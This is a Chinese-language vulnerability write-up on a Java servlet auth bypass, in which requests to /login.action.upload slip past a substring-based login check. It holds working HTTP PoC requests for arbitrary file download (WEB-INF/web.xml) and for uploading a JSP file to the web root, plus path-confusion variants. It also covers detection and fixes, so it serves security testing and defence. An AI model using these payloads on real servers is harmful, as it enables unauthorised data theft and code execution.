---
id: web-generic-auth-servletpath-contains-login-action-star-upload-bypass
title: 鉴权 Filter 判断 getServletPath() 含 "/login.action" 且放行 `*.upload`：/login.action.upload 绕过鉴权进受保护上传 Servlet
type: scenario
domain: web
path: web/generic/auth
technique: servletpath-substring-login-action-wildcard-servlet-bypass
aliases:
- login.action 子串绕过鉴权
- /login.action.upload 绕过
- 后缀映射 Servlets 绕过 Filter
- 路径包含登录接口即放行
- getServletPath indexOf 绕过
tags:
- java
- servlet-filter
- auth-bypass
- path-pattern
- file-upload
- file-download
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-21
  verified_at: '2026-11-08T12:48:46+08:00'
  notes: 已对照原文核对：web.xml filter-mapping(*.action/*.upload)、AuthenticationFilter indexOf(/login.action) 放行、/login.action.upload 返回 is not Multipart、downLoad&path=WEB-INF/web.xml 任意下载、norename=true 上传 1.jsp 落 /attachment/store/md5 并解析成功，截图 05/12/14/17/21/23-27 均吻合；dedup_review 对比 tmall/oa-jsf 成立，非同链；原文未给出系统名称版本，无 affected_versions。
---

## 一句话结论

当鉴权 Filter 的放行条件是“`getServletPath()` 中包含 `/login.action`”，且同一容器里存在映射为 `*.upload` 的 Servlet 时，请求 `/login.action.upload` 既能匹配 `*.upload` 的 Servlet、其 servletPath 又包含 `/login.action`，于是通过 Filter 直达原本需要登录的 FileUploadService；该 Servlet 内部还支持 `download` 参数任意路径下载与 `norename=true` 控制文件名上传，一个子串判断即可拿到任意文件读取与任意文件写入。

## 原理

- Filter 用 `request.getServletPath().indexOf("/login.action") == -1` 判断“是否访问登录接口”，这是子串包含而非路径相等：任何包含 `/login.action` 的 servletPath 都会被视作登录请求而放行。
- Servlet 的 `*.upload` 是扩展名映射，匹配规则是“URL 最后一段以 .upload 结尾”，因此 `/login.action.upload` 的 servletPath 就是 `/login.action.upload`，它同时满足两个条件：含 `/login.action`、以 `.upload` 结尾。
- 容器先做 URL → Servlet 匹配再做 Filter 判断，两者用的都是同一个 servletPath，所以“放行判断用的字符串”和“实际调用的处理器”被攻击者用一次拼接同时满足；这是“防护判定对象与执行对象不一致”的典型形态。
- 该 FileUploadService 的 `doPost` 按参数名分派：`download` 走 `downLoad()`，`md5` 走分片，其余走 multipart 上传。`downLoad()` 里 `path` 参数（支持 `base64`、`dir`、`ftp` 等变体）几乎未经校验就 `new File(path)` 并回写响应流，构成任意文件下载。
- 上传分支中 `norename` 为 true 时文件名取客户端 `filename`，且当 `getDir()` 以 `/md5` 结尾时 `ext` 被置空，最终路径为 `dir + "\" + name`；传入自定义 `path` 目录 + `norename=true` 即可让文件名与后缀完全可控，绕过“md5 重命名 + 无后缀”的默认保护。

## 触发条件

- 鉴权 Filter 使用 `getServletPath()`/`getRequestURI()` 的 `contains`/`indexOf` 判断登录接口，而不是精确匹配。
- 存在扩展名映射（`*.upload`、`*.do`、`*.json` 等）的 Servlet，且该 Servlet 提供上传/下载/配置读取等敏感能力。
- 攻击者能把目标 Servlet 的 URL 拼成“包含登录关键字 + 命中后缀”的形式（如 `/login.action.upload`）。
- 目标 Servlet 内部对 `path`/`norename` 等参数缺乏二次鉴权。

## 利用步骤

1. 从 `web.xml` 或代码中确认 Filter 的放行条件（此处是 servletPath 含 `/login.action`）与 Servlet 的 url-pattern（`*.upload`）。
2. 直接访问受保护路径（如 `/Service.upload`）确认会被 302 到登录页；再访问 `/login.action.upload` 观察是否返回业务响应而非登录跳转——不跳转即绕过成功。
3. 先用 `?downLoad&path=WEB-INF/web.xml` 读取配置文件，验证任意文件下载并获取更多路径/凭据。
4. 再用 multipart 上传：`?norename=true&path=<目标可写目录>` + `filename=1.jsp`，从响应里的 `path` 字段拿到实际落盘位置。
5. 访问落盘路径验证 JSP 解析；如目录不可执行，则改为覆盖配置文件或写入计划任务类文件。

## PoC

```http
GET /xxx/login.action.upload HTTP/1.1
Host: target
```

返回 `{"info":"error:is not Multipart!","status":3}` 说明已进入该 Servlet 而非登录页。

```http
GET /xxx/login.action.upload?downLoad&path=WEB-INF/web.xml HTTP/1.1
Host: target
```

响应头 `Content-Disposition: attachment; filename=web.xml` 并回显 web.xml 内容。

```http
POST /xxx/login.action.upload?norename=true&path=../../webapps/ROOT HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/png

<% out.print(1); %>
------b--
```

响应中的 `path` 字段给出落盘位置，直接访问即可。

## 变体与关联

- 变体：把 `/login.action` 换成其他白名单子串（`/login`、`/error`、`/static`、`/api/public`），只要 Filter 用 contains 判断就同样可用。
- 变体：用 `;jsessionid`、`%2f`、`..;/` 等让 servletPath 与容器实际解析路径产生差异，命中同一判断。
- 变体（同源缺陷、无需构造路径）：若 Filter 只映射 `*.action`、`*.upload` 这类后缀，而另一个上传 Servlet 的 url-pattern 是无后缀的精确映射 `/upload`，则该 Servlet 根本不在 Filter 覆盖范围内，匿名直接 POST 即可调用，无需 `login.action` 前缀；即“Filter 映射范围与 Servlet 映射不重合”。此时上传落地仍受“信任 multipart filename → .jsp 落 Web 根”影响，见 [[web-generic-file-upload-multipart-filename-jsp-tomcat-webshell]]。
- 关联：同类“路径子串白名单绕过”见 [[web-generic-auth-oa-downloadfilter-protectfilter-path-substring-bypass]]；以请求参数控制放行条件的变体见 [[web-generic-auth-loginadminfilter-sybz-param-bypass]]。
- 边界：Filter 若改为“servletPath 以 /login.action 结尾”或使用精确 `equals`，或对 `*.upload` 单独再要求登录，则本链断开。

## 检测与防御

- 检测：访问日志中出现含 `/login.action.` 后接其他后缀的路径；同一 session 先访问 `*.upload` 再带 `path=/WEB-INF/` 等敏感路径；`norename=true` 参数出现。
- 修复：放行判断改为精确匹配（`equals("/login.action")` 或规范化后比对），禁止 contains/indexOf；鉴权 Filter 用 `/*` 覆盖全部 Servlet，再对少数匿名接口显式放行。
- 加固：敏感 Servlet 内部对 `path` 参数做白名单目录校验、禁止 `..` 与绝对路径；上传强制服务端重命名并校验扩展名；`norename` 类调试参数在生产环境移除。
